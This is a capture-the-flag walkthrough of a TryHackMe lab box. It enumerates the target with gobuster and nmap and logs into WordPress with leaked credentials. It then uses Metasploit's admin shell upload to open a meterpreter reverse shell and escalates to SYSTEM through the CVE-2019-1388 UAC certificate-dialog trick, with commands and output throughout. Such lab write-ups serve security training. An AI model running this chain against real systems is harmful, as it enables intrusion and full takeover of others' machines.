# TryHackMe: Advent of Cyber, Accumulate

Accumulate is a  Windows CTF offered as part of the Advent of Cyber collection on TryHackMe. It features `nmap`, `gobuster`, Metasploit `msfconsole`, `xrdpfree`, WordPress and a super-interesting privilege escalation.

## [Task 18] [Day 13] Accumulate 

### 1. A web server is running on the target. 
What is the hidden directory which the website lives on?

#### GoBuster scan

```console
kali@kali:~$ gobuster dir -u http://10.10.137.209 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.137.209
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/16 18:01:52 Starting gobuster
===============================================================
/retro (Status: 301)
```

#### Hidden directory
```
/retro
```

### 2. Gain initial access and read the contents of user.txt

#### Nmap 
```console
kali@kali:~$ nmap 10.10.137.209 -A
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-16 17:57 EDT
Nmap scan report for 10.10.137.209
Host is up (0.017s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-09-16T21:57:28+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-05-21T21:44:38
|_Not valid after:  2020-11-20T21:44:38
|_ssl-date: 2020-09-16T21:57:29+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
```

#### Web service digging

- Author name: `wade`
- Potential password: `parzival`
    - http://10.10.137.209/retro/index.php/2019/12/09/ready-player-one/#comment-2

#### Attempting to login to WP
Trying credentials `wade:parzival` via `/wp-login.php`.

And we are successful logged in, and redirected to admin portal.

#### Identify an exploit for WordPress w/ MetaSploit

```console
kali@kali:~$ msfconsole
                                                  
# cowsay++
 ____________                                                                                                                                  
< metasploit >                                                                                                                                 
 ------------                                                                                                                                  
       \   ,__,                                                                                                                                
        \  (oo)____                                                                                                                            
           (__)    )\                                                                                                                          
              ||--|| *                                                                                                                         
                                                                                                                                               
                                                                                                                                               
       =[ metasploit v5.0.101-dev                         ]                                                                                    
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]                                                                                    
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]                                                                                    
+ -- --=[ 7 evasion                                       ]                                                                                    
                                                                                                                                               
Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x                                          
                                                                                                                                               
[*] Starting persistent handler(s)...                                                                                                          
msf5 > search wordpress                                                                                                                        
                                                                                                                                               
Matching Modules                                                                                                                               
================                                                                                          

   #   Name                                                           Disclosure Date  Rank       Check  Description
   -   ----                                                           ---------------  ----       -----  -----------
   0   auxiliary/admin/http/wp_custom_contact_forms                   2014-08-07       normal     No     WordPress custom-contact-forms Plugin SQL Upload                                                           
   1   auxiliary/admin/http/wp_easycart_privilege_escalation          2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation                                                          
   2   auxiliary/admin/http/wp_gdpr_compliance_privesc                2018-11-08       normal     Yes    WordPress WP GDPR Compliance Plugin Privilege Escalation                                                   
   3   auxiliary/admin/http/wp_google_maps_sqli                       2019-04-02       normal     Yes    WordPress Google Maps Plugin SQL Injection                                                                 
   4   auxiliary/admin/http/wp_symposium_sql_injection                2015-08-18       normal     Yes    WordPress Symposium Plugin SQL Injection                                                                   
   5   auxiliary/admin/http/wp_wplms_privilege_escalation             2015-02-09       normal     Yes    WordPress WPLMS Theme Privilege Escalation                                                                 
   6   auxiliary/dos/http/wordpress_directory_traversal_dos                            normal     No     WordPress Traversal Directory DoS                                                                          
   7   auxiliary/dos/http/wordpress_long_password_dos                 2014-11-20       normal     No     WordPress Long Password DoS                                                                                
   8   auxiliary/dos/http/wordpress_xmlrpc_dos                        2014-08-06       normal     No     Wordpress XMLRPC DoS                                                                                       
   9   auxiliary/gather/wp_all_in_one_migration_export                2015-03-19       normal     Yes    WordPress All-in-One Migration Export                                                                      
   10  auxiliary/gather/wp_ultimate_csv_importer_user_extract         2015-02-02       normal     Yes    WordPress Ultimate CSV Importer User Table Extract                                                         
   11  auxiliary/gather/wp_w3_total_cache_hash_extract                                 normal     No     WordPress W3-Total-Cache Plugin 0.9.2.4 (or before) Username and Hash Extract                              
   12  auxiliary/scanner/http/wordpress_content_injection             2017-02-01       normal     Yes    WordPress REST API Content Injection                                                                       
   13  auxiliary/scanner/http/wordpress_cp_calendar_sqli              2015-03-03       normal     No     WordPress CP Multi-View Calendar Unauthenticated SQL Injection Scanner                                     
   14  auxiliary/scanner/http/wordpress_ghost_scanner                                  normal     No     WordPress XMLRPC GHOST Vulnerability Scanner                                                               
   15  auxiliary/scanner/http/wordpress_login_enum                                     normal     No     WordPress Brute Force and User Enumeration Utility                                                         
   16  auxiliary/scanner/http/wordpress_multicall_creds                                normal     No     Wordpress XML-RPC system.multicall Credential Collector                                                    
   17  auxiliary/scanner/http/wordpress_pingback_access                                normal     No     Wordpress Pingback Locator                                                                                 
   18  auxiliary/scanner/http/wordpress_scanner                                        normal     No     Wordpress Scanner                                                                                          
   19  auxiliary/scanner/http/wordpress_xmlrpc_login                                   normal     No     Wordpress XML-RPC Username/Password Login Scanner                                                          
   20  auxiliary/scanner/http/wp_arbitrary_file_deletion              2018-06-26       normal     No     Wordpress Arbitrary File Deletion                                                                          
   21  auxiliary/scanner/http/wp_contus_video_gallery_sqli            2015-02-24       normal     No     WordPress Contus Video Gallery Unauthenticated SQL Injection Scanner                                       
   22  auxiliary/scanner/http/wp_dukapress_file_read                                   normal     No     WordPress DukaPress Plugin File Read Vulnerability                                                         
   23  auxiliary/scanner/http/wp_gimedia_library_file_read                             normal     No     WordPress GI-Media Library Plugin Directory Traversal Vulnerability                                        
   24  auxiliary/scanner/http/wp_mobile_pack_info_disclosure                           normal     No     WordPress Mobile Pack Information Disclosure Vulnerability                                                 
   25  auxiliary/scanner/http/wp_mobileedition_file_read                               normal     No     WordPress Mobile Edition File Read Vulnerability                                                           
   26  auxiliary/scanner/http/wp_nextgen_galley_file_read                              normal     No     WordPress NextGEN Gallery Directory Read Vulnerability                                                     
   27  auxiliary/scanner/http/wp_simple_backup_file_read                               normal     No     WordPress Simple Backup File Read Vulnerability                                                            
   28  auxiliary/scanner/http/wp_subscribe_comments_file_read                          normal     No     WordPress Subscribe Comments File Read Vulnerability                                                       
   29  auxiliary/scanner/kademlia/server_info                                          normal     No     Gather Kademlia Server Information
   30  exploit/freebsd/local/rtld_execl_priv_esc                      2009-11-30       excellent  Yes    FreeBSD rtld execl() Privilege Escalation
   31  exploit/linux/http/tr064_ntpserver_cmdinject                   2016-11-07       normal     Yes    Zyxel/Eir D1000 DSL Modem NewNTPServer Command Injection Over TR-064
   32  exploit/linux/misc/quest_pmmasterd_bof                         2017-04-09       normal     Yes    Quest Privilege Manager pmmasterd Buffer Overflow
   33  exploit/multi/http/wp_crop_rce                                 2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload                                                                          
   34  exploit/multi/http/wp_db_backup_rce                            2019-04-24       excellent  Yes    WP Database Backup RCE
   35  exploit/multi/http/wp_dnd_mul_file_rce                         2020-05-11       excellent  Yes    Wordpress Drag and Drop Multi File Uploader RCE                                                            
   36  exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload  2016-05-04       excellent  Yes    WordPress Ninja Forms Unauthenticated File Upload                                                          
   37  exploit/multi/http/wp_responsive_thumbnail_slider_upload       2015-08-28       excellent  Yes    WordPress Responsive Thumbnail Slider Arbitrary File Upload                                                
   38  exploit/multi/php/wp_duplicator_code_inject                    2018-08-29       manual     Yes    Snap Creek Duplicator WordPress plugin code injection
   39  exploit/osx/local/rootpipe                                     2015-04-09       great      Yes    Apple OS X Rootpipe Privilege Escalation
   40  exploit/osx/local/rootpipe_entitlements                        2015-07-01       great      Yes    Apple OS X Entitlements Rootpipe Privilege Escalation
   41  exploit/unix/http/pihole_dhcp_mac_exec                         2020-03-28       good       Yes    Pi-Hole DHCP MAC OS Command Execution
   42  exploit/unix/webapp/joomla_akeeba_unserialize                  2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
   43  exploit/unix/webapp/jquery_file_upload                         2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload
   44  exploit/unix/webapp/php_xmlrpc_eval                            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
   45  exploit/unix/webapp/wp_admin_shell_upload                      2015-02-21       excellent  Yes    WordPress Admin Shell Upload                                                                               
   46  exploit/unix/webapp/wp_advanced_custom_fields_exec             2012-11-14       excellent  Yes    WordPress Plugin Advanced Custom Fields Remote File Inclusion                                              
   47  exploit/unix/webapp/wp_ajax_load_more_file_upload              2015-10-10       excellent  Yes    Wordpress Ajax Load More PHP Upload Vulnerability                                                          
   48  exploit/unix/webapp/wp_asset_manager_upload_exec               2012-05-26       excellent  Yes    WordPress Asset-Manager PHP File Upload Vulnerability                                                      
   49  exploit/unix/webapp/wp_creativecontactform_file_upload         2014-10-22       excellent  Yes    Wordpress Creative Contact Form Upload Vulnerability                                                       
   50  exploit/unix/webapp/wp_downloadmanager_upload                  2014-12-03       excellent  Yes    Wordpress Download Manager (download-manager) Unauthenticated File Upload                                  
   51  exploit/unix/webapp/wp_easycart_unrestricted_file_upload       2015-01-08       excellent  No     WordPress WP EasyCart Unrestricted File Upload                                                             
   52  exploit/unix/webapp/wp_foxypress_upload                        2012-06-05       excellent  Yes    WordPress Plugin Foxypress uploadify.php Arbitrary Code Execution                                          
   53  exploit/unix/webapp/wp_frontend_editor_file_upload             2012-07-04       excellent  Yes    Wordpress Front-end Editor File Upload                                                                     
   54  exploit/unix/webapp/wp_google_document_embedder_exec           2013-01-03       normal     Yes    WordPress Plugin Google Document Embedder Arbitrary File Disclosure                                        
   55  exploit/unix/webapp/wp_holding_pattern_file_upload             2015-02-11       excellent  Yes    WordPress Holding Pattern Theme Arbitrary File Upload                                                      
   56  exploit/unix/webapp/wp_inboundio_marketing_file_upload         2015-03-24       excellent  Yes    Wordpress InBoundio Marketing PHP Upload Vulnerability                                                     
   57  exploit/unix/webapp/wp_infinitewp_auth_bypass                  2020-01-14       manual     Yes    WordPress InfiniteWP Client Authentication Bypass                                                          
   58  exploit/unix/webapp/wp_infusionsoft_upload                     2014-09-25       excellent  Yes    Wordpress InfusionSoft Upload Vulnerability                                                                
   59  exploit/unix/webapp/wp_lastpost_exec                           2005-08-09       excellent  No     WordPress cache_lastpostdate Arbitrary Code Execution                                                      
   60  exploit/unix/webapp/wp_mobile_detector_upload_execute          2016-05-31       excellent  Yes    WordPress WP Mobile Detector 3.5 Shell Upload                                                              
   61  exploit/unix/webapp/wp_nmediawebsite_file_upload               2015-04-12       excellent  Yes    Wordpress N-Media Website Contact Form Upload Vulnerability                                                
   62  exploit/unix/webapp/wp_optimizepress_upload                    2013-11-29       excellent  Yes    WordPress OptimizePress Theme File Upload Vulnerability                                                    
   63  exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload  2014-11-11       excellent  Yes    WordPress Photo Gallery Unrestricted File Upload                                                           
   64  exploit/unix/webapp/wp_phpmailer_host_header                   2017-05-03       average    Yes    WordPress PHPMailer Host Header Command Injection                                                          
   65  exploit/unix/webapp/wp_pixabay_images_upload                   2015-01-19       excellent  Yes    WordPress Pixabay Images PHP Code Upload                                                                   
   66  exploit/unix/webapp/wp_plainview_activity_monitor_rce          2018-08-26       excellent  Yes    Wordpress Plainview Activity Monitor RCE                                                                   
   67  exploit/unix/webapp/wp_platform_exec                           2015-01-21       excellent  No     WordPress Platform Theme File Upload Vulnerability                                                         
   68  exploit/unix/webapp/wp_property_upload_exec                    2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability                                                        
   69  exploit/unix/webapp/wp_reflexgallery_file_upload               2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability                                                              
   70  exploit/unix/webapp/wp_revslider_upload_execute                2014-11-26       excellent  Yes    WordPress RevSlider File Upload and Execute Vulnerability                                                  
   71  exploit/unix/webapp/wp_slideshowgallery_upload                 2014-08-28       excellent  Yes    Wordpress SlideShow Gallery Authenticated File Upload                                                      
   72  exploit/unix/webapp/wp_symposium_shell_upload                  2014-12-11       excellent  Yes    WordPress WP Symposium 14.11 Shell Upload                                                                  
   73  exploit/unix/webapp/wp_total_cache_exec                        2013-04-17       excellent  Yes    WordPress W3 Total Cache PHP Code Execution                                                                
   74  exploit/unix/webapp/wp_worktheflow_upload                      2015-03-14       excellent  Yes    Wordpress Work The Flow Upload Vulnerability                                                               
   75  exploit/unix/webapp/wp_wpshop_ecommerce_file_upload            2015-03-09       excellent  Yes    WordPress WPshop eCommerce Arbitrary File Upload Vulnerability                                             
   76  exploit/unix/webapp/wp_wptouch_file_upload                     2014-07-14       excellent  Yes    WordPress WPTouch Authenticated File Upload                                                                
   77  exploit/unix/webapp/wp_wysija_newsletters_upload               2014-07-01       excellent  Yes    Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload                            
   78  exploit/windows/browser/adobe_flashplayer_newfunction          2010-06-04       normal     No     Adobe Flash Player "newfunction" Invalid Pointer Use
   79  exploit/windows/fileformat/adobe_flashplayer_button            2010-10-28       normal     No     Adobe Flash Player "Button" Remote Code Execution
   80  exploit/windows/fileformat/adobe_flashplayer_newfunction       2010-06-04       normal     No     Adobe Flash Player "newfunction" Invalid Pointer Use
   81  exploit/windows/fileformat/ms12_005                            2012-01-10       excellent  No     MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability
   82  exploit/windows/fileformat/winrar_name_spoofing                2009-09-28       excellent  No     WinRAR Filename Spoofing
   83  exploit/windows/ftp/easyftp_cwd_fixret                         2010-02-16       great      Yes    EasyFTP Server CWD Command Stack Buffer Overflow
   84  exploit/windows/http/sws_connection_bof                        2012-07-20       normal     Yes    Simple Web Server Connection Header Buffer Overflow
   85  post/windows/gather/credentials/razer_synapse                                   normal     No     Windows Gather Razer Synapse Password Extraction


Interact with a module by name or index, for example use 85 or use post/windows/gather/credentials/razer_synapse                                                                                                    

msf5 > use 45
```

#### Setting up WordPress admin shell exploit
```
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password parzival
password => parzival
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username wade
username => wade
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 10.10.137.209
rhosts => 10.10.137.209
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost tun0
lhost => tun0
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /retro
targeturi => /retro
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.11.8.219:4444 
[*] Authenticating with WordPress using wade:parzival...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /retro/wp-content/plugins/VwtVnvVYKf/eEoBMtWmVy.php...
[*] Sending stage (38288 bytes) to 10.10.137.209
[*] Meterpreter session 1 opened (10.11.8.219:4444 -> 10.10.137.209:49908) at 2020-09-16 18:20:50 -0400
[+] Deleted eEoBMtWmVy.php
[+] Deleted VwtVnvVYKf.php
[!] This exploit may require manual cleanup of '../VwtVnvVYKf' on the target

meterpreter > 
```

I tried to find the flags in the meterpreter shell, but to no avail, and parked it for the time being.

#### Finding the user flag

Looking back on the earlier `nmap` scan, I realised there's an RDP server running on port `3389`, so I connected to this. 

I tried `administrator:` at first, but this didn't work. Instead, I tried `Wade:parzival` and got a remote desktop connection!

```console
kali@kali:~$ xfreerdp /u:Wade /p:parzival /v:10.10.231.45:3389
```

On login we see the user flag sat on Wade's desktop.

### 3. [Optional] Elevate privileges and read the content of root.txt

This was an interesting one...

After digging around for some simpler way to Privesc. It's probably easier to explain.

1. Create an RDP connection to the box as Wade.
2. Right-click the `hhcpd.exe` on the Desktop
3. Run-as Administrator
4. On UAC message popup, click `show more details...`
5. Then, click `show more information about the certificate...`
6. Click the `Issued By` link something to do with Verisign.
7. Close the UAC popup, and close any error.
8. In the IE window that's opened, `Save the webpage As` (hit Ctrl+S)
9. When the pop-up box appears, input `C:\Windows\System32.cmd` in the URL path section, and run.
10. Voila, root shell. Type `whoami` and you'll see `NT\Authority` !?

If you want a better walkthrough, check out the [exploit CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388/blob/master/CVE-2019-1388.gif) here; it's crazy!

In terms of the root flag, navigate to `C:\Users\Administrator\Desktop` in the root shell, then `type root.txt`. `type` is kinda like `cat` in Linux.

Enjoy!
